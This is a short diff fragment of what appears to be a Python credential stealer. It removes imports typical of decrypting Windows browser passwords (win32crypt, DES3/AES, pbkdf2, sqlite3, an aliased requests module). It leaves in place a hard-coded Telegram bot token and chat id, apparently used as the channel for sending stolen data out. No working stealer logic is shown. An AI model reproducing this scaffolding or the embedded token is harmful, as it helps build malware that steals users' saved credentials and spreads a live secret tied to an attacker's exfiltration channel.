@@ -1,20 +1,3 @@
-import hmac
-import os
-import json
-import shutil
-import platform
-import requests as x01
-from datetime import datetime, timedelta
-from Cryptodome.Cipher import DES3, AES
-from pyasn1.codec.der import decoder
-from hashlib import sha1, pbkdf2_hmac
-from Cryptodome.Util.Padding import unpad
-import sqlite3
-import base64
-import win32crypt
-import random
-
-import time
 
 apibot1='6398842816:AAHfSOjubjetVrI1etqCoff-KWuQ-Df_ipA'
 id1='6451259775'
